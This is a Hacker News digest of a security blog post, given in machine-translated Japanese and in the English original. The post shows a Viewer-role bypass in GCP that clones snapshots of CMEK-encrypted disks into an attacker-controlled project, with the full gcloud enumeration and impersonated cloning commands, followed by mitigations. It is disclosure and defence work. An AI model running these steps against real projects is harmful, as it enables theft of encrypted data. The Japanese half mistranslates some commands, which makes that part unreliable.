---
source: "https://aneviaro.eu/posts/snapshot-based-cmek-bypass/"
hn_url: "https://news.ycombinator.com/item?id=48345131"
title: "The Risk of GCP Viewer role: Snapshot bypass of a cross-project disk replication"
article_title: "Snapshot-based CMEK Bypass: Cross-Project Disk Replication | Alex Neviarouskaya"
author: "xrustalik"
captured_at: "2026-06-01T00:31:41Z"
capture_tool: "hn-digest"
hn_id: 48345131
score: 2
comments: 0
posted_at: "2026-05-31T12:20:02Z"
tags:
  - hacker-news
  - translated
---

# The Risk of GCP Viewer role: Snapshot bypass of a cross-project disk replication

- HN: [48345131](https://news.ycombinator.com/item?id=48345131)
- Source: [aneviaro.eu](https://aneviaro.eu/posts/snapshot-based-cmek-bypass/)
- Score: 2
- Comments: 0
- Posted: 2026-05-31T12:20:02Z

## Translation

タイトル: GCP のリスク 閲覧者の役割: プロジェクト間のディスク レプリケーションのスナップショット バイパス
記事のタイトル: スナップショット ベースの CMEK バイパス: プロジェクト間のディスク レプリケーション |アレックス・ネビアロスカヤ
説明: この続報では、前述のディスク クローン作成攻撃を補完するスナップショット ベースのバイパスを示します。

記事本文:
スナップショットベースの CMEK バイパス: プロジェクト間のディスク レプリケーション
TL;DR: 従来の基本ロール/閲覧者ロールを使用すると、攻撃者はスナップショットを使用して、顧客管理の暗号化 (CME) を使用してディスクのクローンをプロジェクトに作成し、転送中に CME を効果的に除去できます。 Google は、ディスクをソースとして使用するダイレクト ディスク クローン作成の検証を追加しましたが、スナップショット ベースのクローン作成はバイパスのままです。
前回の記事 では、攻撃者が制御する外部プロジェクトにディスク (CMEK で暗号化されたものでも) のクローンを作成できる GCP ビューア ロールについて説明しました。クローン作成されたディスクは、デフォルトの Google 管理の暗号化 (GME) を使用していました。これにより、元の CMEK 保護が事実上剥奪され、通常はアクセスが強制されるはずの KMS アクセス許可がバイパスされました。
1 月 30 日に、永続ディスク クローン API を使用して CMEK で暗号化されたディスクをクローン作成するときに検証チェックを強制する修正が導入されたという通知を受けました。読者の中には、Google から次の MSA を受け取った人もいるかもしれません。
現在、gcloud および REST API インターフェースを使用して顧客管理の暗号化キー (CMEK) で暗号化された永続ディスクのディスク クローンを作成する場合、API はデフォルトの暗号化を使用します。したがって、クローン作成されたディスクは、ソース ディスクと同じ CMEK キーで暗号化されない可能性があります。この問題を解決するには、影響を受けるプロジェクトを確認し、できるだけ早く API 呼び出しを更新する必要があります。
この問題に関する追加情報と、影響を受ける可能性のあるプロジェクトを更新するために必要なアクションを以下に示します。知っておくべきこと
主な変更点: Persistent Disk クローン API が更新され、CMEK で暗号化されたディスクのクローン作成時に検証チェックが含まれるようになりました。暗号化キーが呼び出しに含まれておらず、元のディスクの CMEK キーと一致しない場合、API は成功しません。

。
注: この API 要件はすでに文書化されていますが、これまで API によって強制されていませんでした。
CMEK で暗号化されたディスクキーのクローンを作成する場合は、「-kms-key」オプション (gcloud) または「diskEncryptionKey」オプション (REST API) を介してソース CMEK キーを含める必要があります。これらのオプションを指定しない場合、API はデフォルトで Google Cloud のデフォルト暗号化を使用するため、暗号化の期待と一致しない可能性があります。
この修正の本質的な意味は、ビューア ロールを使用して、あるプロジェクトから別のプロジェクトにディスクのクローンを作成することは引き続き可能ですが、ソース ディスクが CMEK で暗号化されている場合に、API によって CMEK がサイレントに削除されないようになったことです。ここで、元のキーを指定せずに CMEK で暗号化されたディスクのクローンを作成しようとすると、ディスクの暗号化に使用したのと同じキーを指定するように求めるエラーが発生します。
最初の記事では、スナップショットを使用してバイパスを紹介しましたが、どのようにしてバイパスを見つけたかに焦点を当てたいと思います。
永続ディスク API の discs.insert メソッドを見てみましょう。以前は、sourceDisk パラメータを渡していましたが、この API は、sourceDisk に加えて、sourceSnapshot 、sourceImage 、sourceInstantSnapshot および sourceStorageObject も受け入れます。それらはどれも非常に有望に見えますが、具体的にスナップショットを見てみましょう。
なぜスナップショットなのか?答えは簡単です。閲覧者ロールは、compute.snapshots.list 権限を使用してスナップショット、compute.images.list 権限を使用してイメージ、compute.instantSnapshots.list 権限を使用してインスタント スナップショットを一覧表示できますが、Cloud Storage オブジェクトは一覧表示できません。これらには、storage.objects.list 権限が必要ですが、これは Viewer ロールの一部ではありません (この権限を持つ最も近い最も一般的なロールは、Storage Object Viewer ロールです)。
インスタント スナップショットは、で導入された新しいリソース タイプです。

2024 年 8 月、いくつかの興味深い制限があります。つまり、インスタント スナップショットのソース ディスクが削除されると、インスタント スナップショットも削除されます。新しいリソース タイプであるため、イメージやスナップショットほど人気が​​低い可能性があります。
スナップショット バイパスをテストする準備を整えましょう。必要なものは次のとおりです。
ソース プロジェクト (被害者): 機密データが含まれる CMEK で暗号化されたディスク * と、そのディスクから作成された既存のスナップショットが含まれます。
ターゲット プロジェクト (攻撃者): 攻撃者によって制御されているプロジェクト。
ID: ソース プロジェクト スコープでビューア ロール ** が割り当てられたサービス アカウント。
* ディスクにテスト データを書き込むには、既存の VM に接続してマウントし、「Hello!」を含む testfile.txt を作成します。 。
> sudo mkfs.ext4 /dev/sdb
> sudo mkdir -p /mnt/stateful_partition/datadisk
> sudo マウント /dev/sdb /mnt/stateful_partition/datadisk
>「こんにちは！」とエコーする| sudo tee /mnt/stateful_partition/datadisk/testfile.txt
** 閲覧者の役割には、compute.snapshots.useReadOnly 権限が含まれます。この権限は、スナップショットを使用してスナップショットまたはディスク クローンを作成するために必要です。これは、サービス アカウントに必要な唯一のソース プロジェクト権限です。この権限を含むカスタムまたは事前定義されたロールも同様に脆弱です。
スナップショットによる API 検証のバイパス #
アクセス権を取得したプロジェクトを列挙することから始めましょう。
❯ gcloud コンピューティング ディスクのリスト
名前 場所 LOCATION_SCOPE SIZE_GB タイプ ステータス
クロスアカウント-リーク us-central1-a ゾーン 10 pd-balances READY
example-cmek-data-disk us-central1-a ゾーン 10 pd-balanceed READY
source-vm us-central1-a ゾーン 10 pd-standard READY
CMEK のものは興味深いもので、diskEncryptionKey.kmsKeyName パラメーターに示されているキーで暗号化されていることがわかります。
❯ gcloud compute discs は example-cmek-data-disk --zon について説明します

e="$ゾーン"
作成タイムスタンプ: '2026-04-23T09:54:45.056-07:00'
ディスク暗号化キー:
kmsKeyName: プロジェクト/source-project/locations/us-central1/keyRings/test-ring/cryptoKeys/test-key-2/cryptoKeyVersions/1
EnableConfidentialCompute: false
ID: '7113846737366151227'
種類: コンピューティング#ディスク
ラベル指紋: 42WmSpB8rSM=
lastAttachTimestamp: '2026-04-23T10:03:36.132-07:00'
lastDetachTimestamp: '2026-04-23T10:03:47.696-07:00'
名前: example-cmek-data-disk
物理ブロックサイズバイト: '4096'
Pzi を満たす: true
selfLink: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a/disks/example-cmek-data-disk
サイズGB: '10'
ステータス: 準備完了
タイプ: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a/diskTypes/pd-balance
ゾーン: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a
現在のプロジェクトにディスクから作成されたスナップショットがあるかどうかを確認してみましょう。
❯ gcloud compute スナップショット リスト \
--format="テーブル(sourceDisk.basename():label=DISK、name:label=SNAPSHOT、creationTimestamp、status)"
ディスクスナップショット作成_タイムスタンプステータス
example-cmek-data-disk cmek-encrypted-snapshot 2026-04-23T13:06:39.202-07:00 READY
❯
❯ gcloud compute スナップショットは cmek-encrypted-snapshot について説明します
作成サイズバイト: '69952'
作成タイムスタンプ: '2026-04-23T13:06:39.202-07:00'
ディスクサイズGb: '10'
ダウンロードバイト: '79578'
EnableConfidentialCompute: false
ID: '5529120413504226593'
種類: 計算#スナップショット
ラベル指紋: 42WmSpB8rSM=
名前: cmek-暗号化されたスナップショット
selfLink: https://www.googleapis.com/compute/v1/projects/source-project/global/snapshots/cmek-encrypted-snapshot
スナップショット暗号化キー:
kmsKeyName: プロジェクト/source-project/locations/us-central1/keyRings/test-ring/cryptoKeys/test-key-2/cryptoKeyVersions/1
ソースディスク: https://www.googleapis.com/

compute/v1/projects/source-project/zones/us-central1-a/disks/example-cmek-data-disk
ソースディスク ID: '7113846737366151227'
ステータス: 準備完了
ストレージバイト: '69952'
storageBytesStatus: UP_TO_DATE
保管場所:
- 私たち
スナップショットには、ソース ディスクが暗号化されているのと同じキーを指す snapshotEncryptionKey.kmsKeyName パラメーターがあります。このスナップショットを使用して、攻撃者のプロジェクトにディスク クローンを作成してみましょう。
❯ gcloud 構成セット プロジェクト "$ATTACKER_PROJECT"
プロパティ [コア/プロジェクト] を更新しました。
❯
❯ gcloud compute discs はスナップショットからクローンコピー cmek を作成します \
--source-snapshot="プロジェクト/${SOURCE_PROJECT}/global/snapshots/${CMEK_SNAPSHOT}" \
--impersonate-service-account="${SOURCE_SA_EMAIL}" \
--zone="$ZONE"
警告: このコマンドはサービス アカウントの偽装を使用しています。すべての API 呼び出しは [cross-account-leak-test@source-project.iam.gserviceaccount.com] として実行されます。
警告: このコマンドはサービス アカウントの偽装を使用しています。すべての API 呼び出しは [cross-account-leak-test@source-project.iam.gserviceaccount.com] として実行されます。
[https://www.googleapis.com/compute/v1/projects/攻撃者-プロジェクト/zones/us-central1-a/disks/cloned-copy-cmek-from-snapshot] を作成しました。
名前 ゾーン サイズ_GB タイプ ステータス
クローンコピー-cmek-from-snapshot us-central1-a 10 pd-standard READY
バイパスは成功します。クローンディスクを接続してマウントすると、その内容が攻撃者のプロジェクトで読み取れるようになります。
その背後にあるメカニズムは、最初の記事で説明したものと同じです。
CMEK の復号は、ユーザーが直接実行するのではなく、ソース プロジェクトの Compute Engine サービス エージェントによって実行されます。
compute.snapshots.useReadOnly 権限は、読み取りまたはクローン作成を目的としたデータの復号化をサービス エージェントに効果的に許可します。
クローン作成操作ではデータが読み取られて新しいディスクに書き込まれるため、

ターゲット プロジェクトでキーが指定されていない場合、新しいディスクは単にデフォルトで Google 管理の暗号化 (GME) を使用します。
これにより、転送中に CMEK が効果的に削除されます。攻撃者はソースキーに対するcloudkms.cryptoKeyVersions.useToDecrypt権限を必要とせず、ターゲットプロジェクトにキーが存在する必要もありません。
この修正を導入する際、GCP はsourceDisk パラメータの検証に対応しましたが、スナップショットやイメージなどの他のソースに対しては同じチェックを強制しませんでした。
基本的な役割を避ける: 役割/閲覧者 (および他の基本的な役割) の使用を停止します。これは最小特権の原則に従っていないため、予期しない結果が生じる可能性があります。
カスタム ロールを使用する: 最小特権の原則に従うカスタム ロールを作成します。ユーザーがメタデータを表示する必要があるだけの場合は、 compute.disks.useReadOnly を付与しないでください。
権限の監査: ディスク データを読み取る権限を保持しているユーザーを定期的に監査します。 useReadOnly を「ハードドライブをダウンロードできる」と同等のものとして扱います。
組織ポリシーの制約: 組織ポリシーを使用して、プロジェクト間のサービス アカウントの使用を制限し、リソース共有に使用できるプロジェクトを制限します。
サービス エージェントの監査 : サービス エージェントは単なるサービス アカウントであり、悪用される可能性があります。サービス エージェントに付与されたアクセス許可を監査し、通常のサービス アカウントの場合と同様に、それらのアクセス許可を最小限に抑えるように努めます。

## Original Extract

This follow-up demonstrates a snapshot-based bypass that complements the disk-cloning attack described earlier.

Snapshot-based CMEK Bypass: Cross-Project Disk Replication
TL;DR: The legacy basic roles/viewer role enables an attacker to use snapshots to clone disk with Customer-managed encryption (CME) into their project, effectively stripping CME during the transfer. Google added validation for direct disk cloning using a disk as a source, but snapshot-based cloning remains a bypass.
In my previous article , we talked about the GCP Viewer role, which allows an attacker to clone disks (even CMEK-encrypted ones) into an external project, controlled by the attacker. The cloned disk used default Google-managed encryption (GME), which effectively stripped the original CMEK protection and bypassed the KMS permissions you would normally expect to enforce access.
On January 30 I was notified, that the fix was introduced, enforcing the validation check, when cloning the CMEK-encrypted disks, using the persistent disk clone APIs . Some readers may have received the following MSA from Google:
Currently, when you create a disk clone of a Customer-Managed Encryption Key (CMEK) encrypted Persistent Disk using the gcloud and REST API interfaces, the APIs use default encryption. Therefore, the cloned disk may not be encrypted with the same CMEK key as the source disk. To resolve this issue, you need to review the impacted projects and update your API calls as soon as possible.
We’ve provided additional information below about this issue, and the actions required to update any projects that may have been impacted. What you need to know
Key changes: Persistent Disk clone APIs are being updated to include a validation check when cloning CMEK-encrypted disks. The APIs will not succeed if the encryption key is not included in the call and doesn’t match the original disk’s CMEK key.
Note: This API requirement is already documented, but has not been previously enforced by the API.
You must include the source CMEK key via the “–kms-key” option (gcloud) or the “diskEncryptionKey” option (REST API) when cloning a CMEK-encrypted diskkey. If you do not specify these options, the APIs will default to Google Cloud default encryption, which may not match your encryption expectations.
What the fix essentially means is: it is still possible to clone the disk from one project to another using the Viewer role , but the API now prevents CMEK from being silently stripped when the source disk is CMEK-encrypted. If we attempt to clone the CMEK-encrypted disk now, without specifying the original key to it, we will face an error, asking us to provide the same key the disk was encrypted with.
In my first article, I teased the bypass via the snapshots, and I would like to focus on how I found it.
Let’s look at the persistent disk API disks.insert method . Previously we were passing the sourceDisk parameter to it, but in addition to sourceDisk , this API also accepts sourceSnapshot , sourceImage , sourceInstantSnapshot and sourceStorageObject . While all of them look very promising, let’s have a look at the snapshots specifically.
Why snapshots? The answer is straightforward. The Viewer role can list snapshots using the compute.snapshots.list permission, images using the compute.images.list permission and instant snapshots, using the compute.instantSnapshots.list permission, but not Cloud Storage objects; those require the storage.objects.list permission, which is not part of the Viewer role (the closest and most popular role you can find with this permission is the Storage Object Viewer role).
Instant snapshots are the newer resource type, introduced in August 2024 , with some interesting limitations, i.e. if the source disk of an instant snapshot is deleted, the instant snapshot is deleted as well. As newer resource types, they are likely less popular than images or snapshots.
Let’s set the stage to test the snapshot bypass. We need:
Source project (victim): contains CMEK-encrypted disk with the sensitive data * and an existing snapshot created from that disk.
Target project (attacker): a project controlled by an attacker.
Identity: a service account, with the Viewer role ** assigned at the source-project scope.
* Filling the disk with the test data was done by attaching and mounting it to the existing VM, and creating a testfile.txt containing “Hello!” .
> sudo mkfs.ext4 /dev/sdb
> sudo mkdir -p /mnt/stateful_partition/datadisk
> sudo mount /dev/sdb /mnt/stateful_partition/datadisk
> echo "Hello!" | sudo tee /mnt/stateful_partition/datadisk/testfile.txt
** The Viewer role includes the compute.snapshots.useReadOnly permission. This permission is required to use the snapshot to create a snapshot or a disk clone. This is the only source-project permission required from the service account. Any custom or predefined role that contains this permission is equally vulnerable.
Bypassing the API validation with snapshots #
Let’s start with enumerating the project, that we got access to.
❯ gcloud compute disks list
NAME LOCATION LOCATION_SCOPE SIZE_GB TYPE STATUS
cross-account-leak us-central1-a zone 10 pd-balanced READY
example-cmek-data-disk us-central1-a zone 10 pd-balanced READY
source-vm us-central1-a zone 10 pd-standard READY
The CMEK one looks interesting, and we can see it’s encrypted with the key shown in diskEncryptionKey.kmsKeyName parameter.
❯ gcloud compute disks describe example-cmek-data-disk --zone="$ZONE"
creationTimestamp: '2026-04-23T09:54:45.056-07:00'
diskEncryptionKey:
kmsKeyName: projects/source-project/locations/us-central1/keyRings/test-ring/cryptoKeys/test-key-2/cryptoKeyVersions/1
enableConfidentialCompute: false
id: '7113846737366151227'
kind: compute#disk
labelFingerprint: 42WmSpB8rSM=
lastAttachTimestamp: '2026-04-23T10:03:36.132-07:00'
lastDetachTimestamp: '2026-04-23T10:03:47.696-07:00'
name: example-cmek-data-disk
physicalBlockSizeBytes: '4096'
satisfiesPzi: true
selfLink: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a/disks/example-cmek-data-disk
sizeGb: '10'
status: READY
type: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a/diskTypes/pd-balanced
zone: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a
Let’s see if there are any snapshots created from disks in the current project.
❯ gcloud compute snapshots list \
--format="table(sourceDisk.basename():label=DISK, name:label=SNAPSHOT, creationTimestamp, status)"
DISK SNAPSHOT CREATION_TIMESTAMP STATUS
example-cmek-data-disk cmek-encrypted-snapshot 2026-04-23T13:06:39.202-07:00 READY
❯
❯ gcloud compute snapshots describe cmek-encrypted-snapshot
creationSizeBytes: '69952'
creationTimestamp: '2026-04-23T13:06:39.202-07:00'
diskSizeGb: '10'
downloadBytes: '79578'
enableConfidentialCompute: false
id: '5529120413504226593'
kind: compute#snapshot
labelFingerprint: 42WmSpB8rSM=
name: cmek-encrypted-snapshot
selfLink: https://www.googleapis.com/compute/v1/projects/source-project/global/snapshots/cmek-encrypted-snapshot
snapshotEncryptionKey:
kmsKeyName: projects/source-project/locations/us-central1/keyRings/test-ring/cryptoKeys/test-key-2/cryptoKeyVersions/1
sourceDisk: https://www.googleapis.com/compute/v1/projects/source-project/zones/us-central1-a/disks/example-cmek-data-disk
sourceDiskId: '7113846737366151227'
status: READY
storageBytes: '69952'
storageBytesStatus: UP_TO_DATE
storageLocations:
- us
The snapshot has the snapshotEncryptionKey.kmsKeyName parameter, pointing to the same key, the source disk is encrypted with. Let’s try to use this snapshot, to create a disk clone in an attacker’s project.
❯ gcloud config set project "$ATTACKER_PROJECT"
Updated property [core/project].
❯
❯ gcloud compute disks create cloned-copy-cmek-from-snapshot \
--source-snapshot="projects/${SOURCE_PROJECT}/global/snapshots/${CMEK_SNAPSHOT}" \
--impersonate-service-account="${SOURCE_SA_EMAIL}" \
--zone="$ZONE"
WARNING: This command is using service account impersonation. All API calls will be executed as [cross-account-leak-test@source-project.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [cross-account-leak-test@source-project.iam.gserviceaccount.com].
Created [https://www.googleapis.com/compute/v1/projects/attacker-project/zones/us-central1-a/disks/cloned-copy-cmek-from-snapshot].
NAME ZONE SIZE_GB TYPE STATUS
cloned-copy-cmek-from-snapshot us-central1-a 10 pd-standard READY
The bypass succeeds. After attaching and mounting the cloned disk, its contents are readable in the attacker’s project.
The mechanism behind it is the same as I described in my first article .
CMEK decryption is performed by the Compute Engine Service Agent of the source project, not the user directly.
The compute.snapshots.useReadOnly permission effectively authorizes the Service Agent to decrypt the data for the purpose of reading or cloning.
Because the cloning operation reads the data and writes it to a new disk in the target project, if no key is specified, the new disk simply defaults to Google-managed encryption (GME).
This effectively removes the CMEK during the transfer. The attacker does not need cloudkms.cryptoKeyVersions.useToDecrypt permission on the source key, nor do they need the key to exist in the target project.
When introducing the fix, GCP addressed validation for the sourceDisk parameter, but did not enforce the same check for other sources such as snapshots or images.
Avoid Basic Roles: Stop using roles/viewer (and other Basic roles). It does not follow the principle of least privilege, and can lead to unexpected outcomes.
Use Custom Roles: Create custom roles that follow the principle of least privilege. If a user only needs to view metadata, do not grant compute.disks.useReadOnly .
Audit Permissions: Regularly audit who holds permissions to read disk data. Treat useReadOnly as equivalent to “can download the hard drive.”
Org Policy Constraints: Use Organization Policies to restrict cross-project service account usage and restrict which projects can be used for resource sharing.
Audit Service Agents : The Service Agent is just a service account, that can be exploited. Audit the permissions granted to the Service Agent, and strive to minimize those, as you do with the regular service accounts.
